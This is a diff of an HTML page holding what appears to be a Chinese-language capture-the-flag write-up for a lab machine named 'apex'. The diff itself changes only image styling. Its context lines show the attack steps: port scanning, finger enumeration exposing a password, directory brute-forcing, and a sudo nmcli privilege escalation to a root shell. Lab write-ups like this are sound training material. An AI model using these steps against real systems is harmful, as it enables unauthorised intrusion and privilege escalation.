@@ -860,7 +860,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds
 <p>其中79是我没有见过的服务，优先级最高</p>
 <h1>2.踩点</h1>
 <p>在hacktricks搜索到了相关<a href="https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-finger.html#79---pentesting-finger" rel="nofollow">网页</a></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a"><img src="https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a"><img src="https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a" alt="Image" style="max-width: 100%;"></a></p>
 <p>有Metasploit的脚本，我们优先利用一下</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ msfconsole
@@ -1111,7 +1111,7 @@ No mail.
 No Plan.
 </pre></div>
 <p>没有有意思的东西，我们去看看Web服务吧</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b"><img src="https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b"><img src="https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b" alt="Image" style="max-width: 100%;"></a></p>
 <p>没有有意思的东西，源码也没有，我们去爆破目录</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ gobuster dir -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.148<span class="pl-pds">"</span></span> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
@@ -1135,7 +1135,7 @@ Starting gobuster <span class="pl-k">in</span> directory enumeration mode
 /server-status        (Status: 403) [Size: 280]
 /.html                (Status: 403) [Size: 280]
 </pre></div>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7"><img src="https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7"><img src="https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7" alt="Image" style="max-width: 100%;"></a></p>
 <p>好像找到重点了，扫描一下架构</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nuclei -u 192.168.205.148                      
@@ -1182,7 +1182,7 @@ Starting gobuster <span class="pl-k">in</span> directory enumeration mode
 [apache-detect] [http] [info] http://192.168.205.148 [<span class="pl-s"><span class="pl-pds">"</span>Apache/2.4.62 (Debian)<span class="pl-pds">"</span></span>]
 </pre></div>
 <p>无果，拷一份网站下来，还是没有东西。仔细想想好像就只有那个法老有特色了，搜一下</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7b416ee3-6a1d-4b80-af63-1f7082cc352e"><img src="https://github.com/user-attachments/assets/7b416ee3-6a1d-4b80-af63-1f7082cc352e" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7b416ee3-6a1d-4b80-af63-1f7082cc352e"><img src="https://github.com/user-attachments/assets/7b416ee3-6a1d-4b80-af63-1f7082cc352e" alt="Image" style="max-width: 100%;"></a></p>
 <p>等会，不会是在那个79服务看这个人的信息吧</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nc -vn 192.168.205.148 79
@@ -1203,7 +1203,7 @@ PGP key:
 personal notes: H0Ru<span class="pl-smi">$$</span>3rv3
 No Plan.</pre></div>
 <p>我去.....</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/eeaaa4aa-fc48-4495-aa84-0f190d6c8afa"><img src="https://github.com/user-attachments/assets/eeaaa4aa-fc48-4495-aa84-0f190d6c8afa" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/eeaaa4aa-fc48-4495-aa84-0f190d6c8afa"><img src="https://github.com/user-attachments/assets/eeaaa4aa-fc48-4495-aa84-0f190d6c8afa" alt="Image" style="max-width: 100%;"></a></p>
 <p>下载下来看看</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ sqlite3 <span class="pl-k">~</span>/Downloads/database.db 
@@ -1303,13 +1303,13 @@ User seth may run the following commands on apex:
     (root) NOPASSWD: /usr/bin/nmcli
 </pre></div>
 <p>还真有人干这事啊，然后我就卡住了。等到8点群里大佬发了wp我才发现又是缩小提权</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/925d251b-9ebe-4070-8f1d-29c36a9ff4b3"><img src="https://github.com/user-attachments/assets/925d251b-9ebe-4070-8f1d-29c36a9ff4b3" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/925d251b-9ebe-4070-8f1d-29c36a9ff4b3"><img src="https://github.com/user-attachments/assets/925d251b-9ebe-4070-8f1d-29c36a9ff4b3" alt="Image" style="max-width: 100%;"></a></p>
 <p>在城南花已开大佬的wp看到了原理：</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/de0b5181-4c5f-48bd-a894-4e312e8c9bb8"><img src="https://github.com/user-attachments/assets/de0b5181-4c5f-48bd-a894-4e312e8c9bb8" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/de0b5181-4c5f-48bd-a894-4e312e8c9bb8"><img src="https://github.com/user-attachments/assets/de0b5181-4c5f-48bd-a894-4e312e8c9bb8" alt="Image" style="max-width: 100%;"></a></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">!</span>/bin/bash
 root@apex:/home/seth# iduid=0(root) gid=0(root) grupos=0(root)</pre></div>
 <p>以下也是大佬的思路</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/1d094ada-fae5-4d7d-987a-79cae98e0126"><img src="https://github.com/user-attachments/assets/1d094ada-fae5-4d7d-987a-79cae98e0126" alt="Image" style="max-width: 100%; height: auto;"></a></p></div>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/1d094ada-fae5-4d7d-987a-79cae98e0126"><img src="https://github.com/user-attachments/assets/1d094ada-fae5-4d7d-987a-79cae98e0126" alt="Image" style="max-width: 100%;"></a></p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
